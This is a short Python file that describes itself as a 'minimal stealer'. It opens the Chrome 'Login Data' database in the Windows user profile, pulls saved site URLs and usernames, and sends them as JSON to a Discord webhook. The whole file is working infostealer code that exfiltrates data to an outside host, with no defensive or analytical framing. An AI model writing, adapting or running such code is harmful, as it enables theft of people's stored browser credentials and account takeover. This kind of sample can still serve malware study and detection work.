"""Minimal stealer shape: browser logins bundled and POSTed to a webhook."""
import json
import os
import sqlite3
import urllib.request

WEBHOOK = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
PROFILE = os.path.join(
    os.getenv("LOCALAPPDATA", ""), "Google\\Chrome\\User Data\\Default"
)


def steal_logins(profile=PROFILE):
    db = os.path.join(profile, "Login Data")
    con = sqlite3.connect(db)
    rows = con.execute("SELECT origin_url, username_value FROM logins").fetchall()
    con.close()
    return rows


def exfiltrate(profile=PROFILE):
    creds = steal_logins(profile)
    body = json.dumps({"content": repr(creds)}).encode()
    req = urllib.request.Request(WEBHOOK, body, {"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10)
